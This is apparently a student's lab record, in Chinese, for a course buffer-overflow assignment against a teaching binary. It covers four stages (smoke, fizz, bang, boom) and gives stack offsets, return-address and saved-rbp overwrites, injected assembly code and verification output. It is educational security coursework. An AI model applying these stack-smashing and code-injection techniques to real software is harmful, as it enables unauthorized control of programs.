# 实验四缓冲区溢出攻击分析记录

生成时间：2026-05-23 11:25:00 +08:00

## 基本信息

- 学号：`U202414558`
- 编译开关：`-DU8`
- cookie：`0x0c1099de`
- `smoke` 地址：`0x401434`
- `fizz` 地址：`0x401451`
- `bang` 地址：`0x4014a5`
- `cookie` 全局变量地址：`0x4040e8`
- `global_value` 全局变量地址：`0x4040ec`
- `test` 中 `getbuf` 调用后的返回地址：`0x4015b8`

## getbuf 栈帧

反汇编显示：

```text
push rbp
mov rbp,rsp
sub rsp,0x40
...
lea rax,[rbp-0x30]   ; buf
...
leave
ret
```

因此：

| 位置 | 相对 `buf` 偏移 | 说明 |
|---|---:|---|
| `buf` 起始 | `0` | `rbp-0x30` |
| 保存的 `rbp` | `48` | 覆盖该位置会改变 `leave` 弹出的 `rbp` |
| 返回地址 | `56` | 覆盖该位置会改变 `ret` 跳转目标 |

GDB 探测记录：

```text
rbp = 0x7fffffffdde0
buf = 0x7fffffffddb0
saved rbp value = 0x00007fffffffde20
return address value = 0x00000000004015b8
```

## smoke

攻击目标：从 `getbuf` 返回时跳转到 `smoke`。

攻击串结构：

```text
56 字节填充 + smoke 地址 0x401434 的小端表示
```

输出验证：

```text
Smoke!: You called smoke()
```

## fizz

`fizz` 入口处会将 `edi` 写入 `[rbp-0x4]`，但直接控制 `edi` 较困难。采用提示中的方法，从 `fizz+0xb` 即 `0x40145c` 开始执行，使代码直接读取 `[rbp-0x4]` 并与 `cookie` 比较。

将保存的 `rbp` 覆盖为：

```text
cookie 地址 + 4 = 0x4040ec
```

则 `[rbp-0x4]` 正好是 `cookie` 全局变量。

攻击串结构：

```text
48 字节填充 + 0x4040ec 小端 + 0x40145c 小端
```

输出验证：

```text
Fizz!: You called fizz(0xc1099de)
```

## bang

目标：先执行注入代码，把 `global_value` 改为 `cookie`，再跳转到 `bang`。

注入代码逻辑：

```asm
movabs $0x4040ec, %rax
movl   $0x0c1099de, (%rax)
movabs $0x4014a5, %rax
jmp    *%rax
```

机器码长度为 28 字节，放在 `buf` 开头；返回地址覆盖为 GDB 探测到的 `buf` 地址 `0x7fffffffddb0`。

攻击串结构：

```text
注入代码 + 填充到 48 字节 + 原保存 rbp 0x7fffffffde20 + buf 地址 0x7fffffffddb0
```

验证方式：在 GDB 中 `set disable-randomization on` 后运行。

输出验证：

```text
Bang!: You set global_value to 0xc1099de
```

## boom

目标：让 `getbuf` 返回 cookie，并正常回到 `test` 中 `getbuf` 调用后的指令。

注入代码逻辑：

```asm
mov    $0x0c1099de, %eax
movabs $0x4015b8, %rdx
jmp    *%rdx
```

保存的 `rbp` 覆盖为原值 `0x7fffffffde20`，使跳回 `test` 后 `[rbp-0x4]` 等栈变量访问仍然正确；返回地址覆盖为 `buf` 地址。

攻击串结构：

```text
注入代码 + 填充到 48 字节 + 原保存 rbp 0x7fffffffde20 + buf 地址 0x7fffffffddb0
```

验证方式：在 GDB 中 `set disable-randomization on` 后运行。

输出验证：

```text
Boom!: getbuf returned 0xc1099de
bye bye , U202414558
```

## 说明

smoke 和 fizz 不依赖栈代码地址，可直接普通运行验证。bang 和 boom 使用栈上注入代码，依赖 `buf` 的运行时地址；本次通过 GDB 禁用随机化并保存栈地址探测记录后完成验证。
